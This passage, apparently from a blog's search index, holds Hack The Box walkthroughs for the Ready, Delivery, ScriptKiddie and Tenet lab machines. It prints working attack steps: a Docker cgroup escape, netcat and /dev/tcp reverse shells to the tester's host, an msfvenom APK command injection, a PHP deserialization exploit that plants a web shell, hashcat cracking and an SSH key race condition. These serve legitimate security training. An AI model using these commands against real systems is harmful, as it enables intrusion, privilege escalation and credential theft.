flag.   git@gitlab:/opt/backup$ su root Password: root@gitlab:/opt/backup# ls -la /root total 28 drwx------ 1 root root 4096 Feb 27 13:24 . drwxr-xr-x 1 root root 4096 Dec  1 12:41 .. lrwxrwxrwx 1 root root    9 Dec  7 16:56 .bash_history -&gt; /dev/null -rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc drwxr-xr-x 2 root root 4096 Feb 27 13:24 .nano -rw-r--r-- 1 root root  148 Aug 17  2015 .profile drwx------ 2 root root 4096 Dec  7 16:49 .ssh -rw------- 1 root root 1565 Dec 13 15:06 .viminfo root@gitlab:/opt/backup#   Escaping container   Once we have privileged access inside the container, if it is running under specific circunstancies, we can escape to the host as was very well documented in this blog post Understanding Docker container escapes | Trail of Bits Blog, found after some research in this scenario.   Following the step-by-step described on it, created a listener in 4443 TCP in attacker machine and executed the following steps using root privileges, obtaining this way a reverse shell.   # In the container mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x   echo 1 &gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" &gt; /tmp/cgrp/release_agent   echo '#!/bin/sh' &gt; /cmd echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f\" &gt;&gt; /cmd chmod a+x /cmd   sh -c \"echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs\"   In the received connection, confirmed that we were in the host running docker ps command and then obtained the root flag.   $ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.220] 38246 /bin/sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) # docker ps CONTAINER ID        IMAGE                          COMMAND             CREATED             STATUS                 PORTS                                   NAMES 7eb263389e5e        gitlab/gitlab-ce:11.4.7-ce.0   \"/assets/wrapper\"   2 months ago        Up 5 hours (healthy)   22/tcp, 443/tcp, 0.0.0.0:5080-&gt;80/tcp   docker-gitlab_web_1 # cat /root/root.txt &lt;redacted&gt;   I hope you guys have enjoyed.   See you in the next post! :smile:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Medium","HTB Linux"],
        "url": "/walkthrough/2021/05/htb-ready",
        "teaser": "https://i.imgur.com/0eaJMfD.png"
      },{
        "title": "Walktrough: HTB Delivery",
        "excerpt":"Hello guys!   This week’s machine will be Delivery, another easy-rated machine from Hack The Box, created by ippsec.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      This box’s resolution was pretty interesting, where I had the opportunity to learn how to crack passwords using a dictionary variation using hashcat, besides the several pivoting, until get to the user credentials, and then, getting root.   Enumeration   As usual, started with a nmap quick scan to identify published services in this box.   $ nmap -sC -sV -Pn -oA quick 10.10.10.222 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 17:01 -03 Nmap scan report for 10.10.10.222 Host is up (0.16s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey:  |   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) |   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open  http    nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.54 seconds   80/TCP - HTTP Service   Accessing the page and inspecting the source code, identified that there’s a link to helpdesk.delivery.htb. Added this DNS entry to /etc/hosts, as well as delivery.htb, to make easier access and enumeration to this page.      After clicking to Contact us link, the following information was shown, informing us that as soon as we get a delivery.htb e-mail we could access the MatterMost server, which works at TCP 8065, according to enumeration.      CONTACT US     For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you’ll be able to have access to our MatterMost server.    While looking for a way to get an e-mail address with HelpDesk, raised a support ticket with dummy content while inspecting the requests using BurpSuite.   After submitting the request, received the information below, something crucial to obtain access to Mattermost: a @delivery.htb e-mail address!      Accessing the Mattermost platform, created an account using the osTicket provided e-mail. This way, in case we need to receive any kind of confirmation in a delivery.htb account, data will supposedly be sent to the incident history we have just created :smile:.      As expected, once reviewing the request history, we can see the account activation details from Mattermost, sent to 8024065@delivery.htb.      After verifying the account, we were able to access the portal with the created credentials and had access to a public team called Internal.      Among the messages available on this channel, some called attention, but some information was gathered that might be useful for machine resolution:      osTicket Admin Credentials were maildeliverer:Youve_G0t_Mail!.   Devs were using variants of PleaseSubscribe! as passwords everywhere and should stop using it.            These variants could be easily cracked using hashcat rules, which is a great tip on how to obtain the root password or something in its path.              Searching in the osTicket administration page, made logoff of Guest User, from the left upper-corner and, during the sign-in process, selected the option I’m an agent - sign in here, which took me to http://helpdesk.delivery.htb/scp/login.php, where the incidents are managed.      Once logged in as maildeliverer, was able to confirm the osTicket version, which is 1.15.1, where we’re going to look for some existing exploit o weakness that could get us initial access.      Browsing in the console, found an API, which mentions task execution through a scheduler using cron. Inspecting its documentation available at this link it mentions the file scripts\\rcron.php which is used to orchestrate the calls.   Besides having created an API key for my IP Address and tried to use the script available at this link, had no success in executing a payload through the application.   Initial Access and User Flag   Besides several attempts using osTicket API, gave some steps back and thinking simple, asked me: Is maildeliverer a user at this machine? On I tried to SSH using its account I was able to not only connect to this machine (:man_facepalming:) but also get the flag in user.txt, available at his root directory.   $ ssh maildeliverer@10.10.10.222                                                                                                  The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established. ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.222' (ECDSA) to the list of known hosts. maildeliverer@10.10.10.222's password: Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64  The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Jan  5 06:09:50 2021 from 10.10.10.10 maildeliverer@Delivery:~$ ls -la total 28 drwxr-xr-x 3 maildeliverer maildeliverer 4096 Jan  3 23:12 . drwxr-xr-x 3 root          root          4096 Dec 26 09:01 .. lrwxrwxrwx 1 root          root             9 Dec 28 07:04 .bash_history -&gt; /dev/null -rw-r--r-- 1 maildeliverer maildeliverer  220 Dec 26 09:01 .bash_logout -rw-r--r-- 1 maildeliverer maildeliverer 3526 Dec 26 09:01 .bashrc drwx------ 3 maildeliverer maildeliverer 4096 Dec 28 06:58 .gnupg -rw-r--r-- 1 maildeliverer maildeliverer  807 Dec 26 09:01 .profile -r-------- 1 maildeliverer maildeliverer   33 Feb 24 06:58 user.txt maildeliverer@Delivery:~$ cat user.txt &lt;redacted&gt;   Root flag   Started with linpeas.sh execution to automate enumeration and the following findings called attention:      Process python3 /root/py-smtp.py running as root. Could eventually allow path hijack if it’s calling some binaries without their full path.   Also, root has a script /root/mail.sh, that could be abused the same way as the previous execution.   MySQL instance running in its default port (TCP 3306).   osTicket   As I couldn’t read any of the two promising files for path hijack, started looking for credentials to get access to MySQL and try to dump some credentials. In osTicket install folder, have found /var/www/osticket/upload/include/ost-config.php which contained the creds for ost_user:   define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3');  define('ADMIN_EMAIL','maildeliverer@delivery.htb');  define('DBTYPE','mysql'); define('DBHOST','localhost'); define('DBNAME','osticket'); define('DBUSER','ost_user'); define('DBPASS','!H3lpD3sk123!');  define('TABLE_PREFIX','ost_');   Besides being able to connect to MySQL, nothing useful was found, so decided to look for credentials in Mattermost installation.   Mattermost   Based on the process in execution, the app resides in /opt/mattermost, where I have found some credentials in the file /opt/mattermost/config/config.json.    \"SqlSettings\": {         \"DriverName\": \"mysql\",         \"DataSource\": \"mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\",         \"DataSourceReplicas\": [],         \"DataSourceSearchReplicas\": [],         \"MaxIdleConns\": 20,         \"ConnMaxLifetimeMilliseconds\": 3600000,         \"MaxOpenConns\": 300,         \"Trace\": false,         \"AtRestEncryptKey\": \"n5uax3d4f919obtsp1pw1k5xetq1enez\",         \"QueryTimeout\": 30,         \"DisableDatabaseSearch\": false     }   Using the credentials found (mmuser:Crack_The_MM_Admin_PW) connected to mattermost database and, at users table, found some password hashes, being root the only with system_admin permissions.   MariaDB [mattermost]&gt; select Username,Password,Roles from Users; +----------------------------------+--------------------------------------------------------------+--------------------------+ | Username                         | Password                                                     | Roles                    | +----------------------------------+--------------------------------------------------------------+--------------------------+ | jdoe                             | $2a$10$qmuCH.AHht/dUGLd8ZyxMOMeZl6nU67B5okAiC0Vx44isKs5y6nkq | system_user              | | surveybot                        |                                                              | system_user              | | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | system_user              | | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | system_user              | | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | system_admin system_user | | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | system_user              | | channelexport                    |                                                              | system_user              | | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | system_user              | +----------------------------------+--------------------------------------------------------------+--------------------------+   As mentioned in the Internal Team, root’s password wouldn’t be in a dictionary-like RockYou but could be a variation of PleaseSubscribe! and that ``hashcat` rules could be the way to crack it. After some research found the following syntax:      Created a file basicpwd.txt containing string PleaseSubscribe!;   Used the file best64.rule which has one of the most popular password variations.   Executing it directly with the correct hash type (3200 - bcrypt), was able to find the password PleaseSubscribe!21   $ hashcat -a 0 -m 3200 hash basicpwd.txt -r /usr/share/hashcat/rules/best64.rule hashcat (v6.1.1) starting...  OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz, 5847/5911 MB (2048 MB allocatable), 2MCU  Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 72  Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 77  Applicable optimizers applied: * Zero-Byte * Single-Hash * Single-Salt  Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled.  Host memory required for this attack: 64 MB  Dictionary cache built: * Filename..: basicpwd.txt * Passwords.: 1 * Bytes.....: 17 * Keyspace..: 77 * Runtime...: 0 secs  The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework  Approaching final keyspace - workload adjusted.  $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21   As root had no SSH access at this box, ran su and was able to connect as him and read the final flag :smiley:.   maildeliverer@Delivery:/opt/mattermost/config$ su root Password: root@Delivery:/opt/mattermost/config# cd /root/ root@Delivery:~# cat root.txt &lt;redacted&gt; root@Delivery:~#   Besides the root flag, ippsec left us a message in note.txt file:      I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I’ve seen several times.  The inspiration for the box is here:     - https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c     Keep on hacking! And please don’t forget to subscribe to all the security streamers out there.     - ippsec    Hope you guys have enjoyed this box!   See you at the next post :smile:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Linux"],
        "url": "/walkthrough/2021/05/htb-delivery",
        "teaser": "https://i.imgur.com/NSbB9Rc.png"
      },{
        "title": "Walktrough: HTB ScriptKiddie",
        "excerpt":"Hello guys!   This week’s machine will be ScriptKiddie, another easy-rated Linux box from Hack The Box, created by 0xdf.   :information_source: Info:  Write-ups for Hack The Box machines are posted as soon as they’re retired.      Enumeration   As usual, started running a nmap quick scan, to see which services were published on this machine.   $ nmap -sC -sV -Pn -oA quick 10.10.10.226                                                                     Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 14:05 -03 Nmap scan report for 10.10.10.226 Host is up (0.077s latency). Not shown: 998 closed ports PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA) |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA) |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519) 5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-server-header: Werkzeug/0.16.1 Python/3.8.5 |_http-title: k1d'5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds   5000/TCP - HTTP Service   Once accessed the published page, noticed some hacking tools published making it easier for a script kiddie to play with hacking, allowing you to scan an IP using nmap, create a msfvenom payload or search for exploits using searchsploit.   I’ve tried several ways to inject commands in these forms, but none of the attempts succeeded. I have even found an interesting tool called commixproject/commix in GitHub that automates this process but had no luck this time.   Looking for vulnerabilities in the tools used by the app (nmap, msfvenom, searchsploit), I have found one related to msfvenom, as below:   $ searchsploit msfvenom ---------------------------------------------------------------------- ---------------------------------  Exploit Title                                                        |  Path ---------------------------------------------------------------------- --------------------------------- Metasploit Framework 6.0.11 - msfvenom APK template command injection | multiple/local/49491.py ---------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   Initial access and User flag   After changing the python script available in searchsploit, using the desired payload rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f, I have found some errors during the execution of the binary keytool, once it tries to sign an APK file with the payload in the Common Name but, as there was a + in the base64 encoded content, made a quick change to encode it twice, allowing me to create an evil APK to be uploaded to the tool and exploit the vulnerability   # Change me payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f'  # b64encode to avoid badchars (keytool is picky) payload_b64 = b64encode(payload.encode()).decode() if '+' in payload_b64:     payload_b64 = b64encode(payload_b64.encode()).decode()     decode = '| base64 -d | base64 -d' else:     decode = '| base64 -d'  dname = f\"CN='|echo -n {payload_b64} {decode} | sh #\"   Below we can see the output of the execution which generates the evil.apk file.   $ python3 49491.py                                                                                                                [+] Manufacturing evil apkfile Payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f -dname: CN='|echo -n Y20wZ0wzUnRjQzltTzIxclptbG1ieUF2ZEcxd0wyWTdZMkYwSUM5MGJYQXZabnd2WW1sdUwzTm9JQzFwSURJK0pqRjhibU1nTVRBdU1UQXVNVFF1TVRNMklEUTBORE1nUGk5MGJYQXZaZz09 | base64 -d | base64 -d | sh #    adding: empty (stored 0%) jar signed.  Warning: The signer's certificate is self-signed. The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update. The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update. POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.  [+] Done! apkfile is at /tmp/tmpt7qr4ner/evil.apk Do: msfvenom -x /tmp/tmpt7qr4ner/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null   After obtaining the evil payload, started one listener and selected the options suggested in the payload output, where selecting the android operating system would result in the payload android/meterpreter/reverse_tcp we aim to abuse based in the existing vulnerability, as well as specifying the lhost as 127.0.0.1 but this shouldn’t impact the way exploit will work.      After hitting the Generate button, a reverse shell was returned, as seen below in this screenshot.      Inspecting the session obtained, with the credentials running the web application, in this case user kid, was possible to obtain the user flag, as the file resided in it’s home directory.   kid@scriptkiddie:~$ id uid=1000(kid) gid=1000(kid) groups=1000(kid) kid@scriptkiddie:~$ cat /home/kid/user.txt &lt;redacted&gt;   Root flag   After running linenum.sh to automate the enumeration, noticed taht there was another user called pwn, possibly with more privileges than the user we currently have. As we had access to it’s home directory, found a file called scanloosers.sh with the following content:   #!/bin/bash  log=/home/kid/logs/hackers  cd /home/pwn/ cat $log | cut -d' ' -f3- | sort -u | while read ip; do     sh -c \"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null\" &amp; done  if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi   As this script reads the content of a file in the current’s user home directory (/home/kid/logs/hackers) and issues an nmap command, edited the content of this file in a way we would inject a reverse shell command with the user running this script, possibly pwn.   echo \"  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4242 0&gt;&amp;1' #\" &gt; ~/logs/hackers   After setting up a new listener and changing the hackers file with the above-mentioned content, another session was obtained, this time with the user pwn :smile:   Enumerating the box again, this time with the new user account, noticed by running linpeas.sh that this user has access to start msfconsole in a privileged way.   [+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid Matching Defaults entries for pwn on scriptkiddie:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User pwn may run the following commands on scriptkiddie:     (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole   Once started it using sudo, I was able to issue commands as user root, as well as read the content of file /root/root.txt and obtain the final flag for this machine.   pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole -q msf6 &gt; id [*] exec: id  uid=0(root) gid=0(root) groups=0(root) msf6 &gt; cat /root/root.txt [*] exec: cat /root/root.txt  &lt;redacted&gt; msf6 &gt;   Hope this was somehow useful!   See you in the next post :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Linux"],
        "url": "/walkthrough/2021/06/htb-scriptkiddie",
        "teaser": "https://i.imgur.com/Egv2O1k.png"
      },{
        "title": "Walktrough: HTB Tenet",
        "excerpt":"Hello guys!   This week’s machine will be Tenet, another medium-rated Linux box from Hack The Box, created by egotisticalSW.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      Before starting the resolution of this box, the image above called my attention, where I searched about TENET on the Internet and found about the Sator Square, where we have a palindrome made up of the 5 Latin words: SATOR, AREPO, TENET, OPERA e ROTAS, forming a square being TENET in the center lines. Is highly probable that these words will appear during its resolution :smile:.   Enumeration   As usual, started with a quick nmap scan to identify the published services:   $ nmap -sC -sV -Pn -oA quick 10.10.10.223 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 14:36 -03 Nmap scan report for 10.10.10.223 Host is up (0.079s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) |   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.06 seconds   80/TCP - HTTP Service   Accessing this page noticed that was from the default Apache install so started right away to enumerate the directories using gobuster where I’ve found the WordPress directory.   $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.223/ -o gobuster.txt -x php,txt,html =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            http://10.10.10.223/ [+] Threads:        10 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes:   200,204,301,302,307,401,403 [+] User Agent:     gobuster/3.0.1 [+] Extensions:     php,txt,html [+] Timeout:        10s =============================================================== 2021/02/27 14:44:51 Starting gobuster =============================================================== /index.html (Status: 200) /users.txt (Status: 200) /wordpress (Status: 301) Progress: 5055 / 220561 (2.29%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/02/27 14:48:08 Finished ===============================================================   Once accessed it the page was loaded without formatting and, inspecting the source code, all the assets were pointing to tenet.htb, which was later added to /etc/hosts file.   Accessing the page again, checking that it was properly rendered now, and then using wpscan to enumerate version, users, and plugins, where I’ve identified this WordPress version as 5.6, no plugins and the users protagonist and neil.   As accessing the webpage again from the URL http://10.10.10.223/wordpress errors are shown, as the image below, accessed the address seen in source code (http://tenet.htb) full blog is displayed.      In the WordPress instance available at http://tenet.htb/wordpress, noticed some posts where one of them was mentioning an application called Rotas, which could contain some item we could abuse to get an initial foothold in this box.      This Is Where Our Worlds Collide We’re looking for beta testers of our new time-management software, ‘Rotas’ ‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.    Things get more interesting in an older post, where user neil comments the content below:      did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!    Trying to access the file sator.php from the directory published under the DNS name hasn’t returned anything, but I’ve succeeded using the machine IP address, getting the output below:      As we have a backup of this file somewhere and backups are often renamed as old or bak, after a few attempts I have found the file sator.php.bak in the same directory as the previous, with the following content:   &lt;?php  class DatabaseExport {     public $user_file = 'users.txt';     public $data = '';          public function update_db()     {         echo '[+] Grabbing users from text file &lt;br&gt;';         $this-&gt; data = 'Success';     }          public function __destruct()     {         file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);         echo '[] Database updated &lt;br&gt;';         //    echo 'Gotta get this working properly...';     } }  $input = $_GET['arepo'] ?? ''; $databaseupdate = unserialize($input);  $app = new DatabaseExport; $app -&gt; update_db();  ?&gt;   As we can see we could exploit it using PHP Deserialization, once it doesn’t validate the inputs received using the GET method from the query string arg arepo, allowing us to modify the payload to be stored in the database file.   Initial access   The first step to the reverse shell was to create a serialized PHP payload to be sent in a request via arepo arg. Searching a little about it I have found this exploit sample which was later modified to store a simple web shell in the box, later used to get a reverse shell.   &lt;?php   class DatabaseExport {     public $user_file = 'shell.php';     public $data = '&lt;?php system($_GET[\"cmd\"]); ?&gt;';          public function update_db()     {         echo '[+] Grabbing users from text file &lt;br&gt;';         $this-&gt; data = 'Success';     }          public function __destruct()     {         file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);         echo '[] Database updated &lt;br&gt;';         //    echo 'Gotta get this working properly...';     } }  $url = 'http://10.10.10.223/sator.php?arepo='; $arepo = $url . urlencode(serialize(new DatabaseExport)); $response = file_get_contents(\"$arepo\"); print \"$response\";   After its execution, I was able to issue the id command by using curl as we can see below.   $ php exploit.php [] Database updated &lt;br&gt;[+] Grabbing users from text file &lt;br&gt; [] Database updated &lt;br&gt;[] Database updated &lt;br&gt;     $ curl -L http://10.10.10.223/shell.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data)   As we had a confirmed RCE, make the call to obtain a reverse shell as the following example:   curl -G --data-urlencode \"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f\" http://10.10.10.223/shell.php   User Flag   Accessing the box, once we already knew that at least one WordPress instance was present, searched for the wp-config.php file where I got the credentials for user neil   // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' );  /** MySQL database username */ define( 'DB_USER', 'neil' );  /** MySQL database password */ define( 'DB_PASSWORD', 'Opera2112' );  /** MySQL hostname */ define( 'DB_HOST', 'localhost' );   As credential reuse is common, running su neil and providing the recently found password, we have succeeded in accessing the machine as this user and getting the user flag.   neil@tenet:~$ id uid=1001(neil) gid=1001(neil) groups=1001(neil) neil@tenet:~$ cat ~/user.txt &lt;redacted&gt; neil@tenet:~$   Root Flag   In the path for root flag, decided to dump the database credentials in this machine, returning the following hashes.   mysql&gt; select user_login,user_pass from wp_users; +-------------+------------------------------------+ | user_login  | user_pass                          | +-------------+------------------------------------+ | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | | neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | +-------------+------------------------------------+ 2 rows in set (0.00 sec)   Before trying to crack those hashes, being protagonist password reused from root, decided to check which permissions did neil had by running sudo -l, which resulted in the output below.   Matching Defaults entries for www-data on tenet:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:      User www-data may run the following commands on tenet:     (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh   Inspecting the content of this file, we can see that it can be used to activate SSH login for root enforcing an existing SSH public key.   #!/bin/bash  checkAdded() {     sshName=$(/bin/echo $key | /usr/bin/cut -d \" \" -f 3)     if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then         /bin/echo \"Successfully added $sshName to authorized_keys file!\"     else         /bin/echo \"Error in adding $sshName to authorized_keys file!\"     fi }  checkFile() {     if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then         /bin/echo \"Error in creating key file!\"         if [[ -f $1 ]]; then /bin/rm $1; fi         exit 1     fi }  addKey() {     tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)     (umask 110; touch $tmpName)     /bin/echo $key &gt;&gt;$tmpName     checkFile $tmpName     /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys     /bin/rm $tmpName }  key=\"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\" addKey checkAdded   As we don’t have the private key, we could hijack its execution because the function addKey creates a temporary file containing the public key to be added to root’s authorized keys, having a race condition. If we could manage to overwrite this file during the script execution, we could inject our public key instead of the one present in the script.   The challenge here is to predict the name of the file created, once it uses the mktemp command, but as we have an idea of its format (/tmp/ssh-XXXXX) we could find a way to paste the contents from our public key to all files matching the same pattern. After some tests and research, the command tee was the solution, allowing us to output a content to multiple files at the same time. The simple script below was created to do this task.   #!/bin/bash while true; do         echo \"ssh-rsa AAAA..............BBBB= root@ubuntu\" | tee /tmp/ssh-* 2&gt; /dev/null; done   With the above script in execution, simply executed the bash script with sudo and then connected to the box with the previously created ssh private key, granting me root access and allowing me to get the root flag :smiley:   neil@tenet:/tmp$ sudo  /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ ssh -i tenet root@tenet.htb Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64) [...] root@tenet:~# id uid=0(root) gid=0(root) groups=0(root) root@tenet:~# cat /root/root.txt b05e57e997cda49b47757cd3f0f9ac43   I hope you guys have enjoyed this box resolution!   See you in the next post! :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Medium","HTB Linux"],
        "url": "/walkthrough/2021/06/htb-tenet",
        "teaser": "https://i.imgur.com/Ya8KoOZ.png"
      },{
